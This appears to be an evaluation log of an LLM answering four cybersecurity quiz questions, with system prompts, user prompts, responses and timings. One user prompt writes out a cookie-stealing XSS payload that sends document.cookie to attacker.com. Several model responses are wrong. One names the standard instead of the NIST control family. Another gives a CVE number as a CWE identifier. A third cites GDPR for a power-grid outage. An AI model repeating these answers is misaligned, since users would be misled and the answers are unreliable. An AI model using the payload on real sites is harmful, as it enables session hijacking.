SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?

LLM RESPONSE:
This statement is a **policy recommendation** and a core component of **security hardening**. Its primary purpose is to **reduce the risk of unauthorized access** to sensitive administrative systems. 

Specifically, it’s a proactive measure to mitigate the potential damage from compromised credentials or insider threats. It’s designed to significantly increase the difficulty of an attack, requiring more than just a password to gain access.

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?

LLM RESPONSE:
NIST SP 800-53.

Response Time: 13.67 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?

LLM RESPONSE:
**Vulnerability:** Cross-Site Scripting (XSS)

**CWE Identifier:** CVE-2023-0333 (This is a common example, but there may be others)**

**Explanation:** The attacker is injecting malicious JavaScript code into the comment.  This code attempts to steal cookies and potentially hijack the user’s session.  The specific identifier reflects the specific vulnerability discovered and how it manifests.

Category: Regulations/Directives - Application
Response Time: 14.66 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?

LLM RESPONSE:
**For incident 1 (Power Grid):** The primary concern is **Data Protection and Privacy** under GDPR, specifically the right to data protection and the obligation to notify affected individuals. The disruption to electricity distribution means the data is now vulnerable.

**For incident 2 (Social Media):** The primary concern is **Data Protection and Privacy** under GDPR, specifically the right to data privacy and the obligation to notify affected individuals. The exposure of millions of personal messages raises significant privacy concerns.
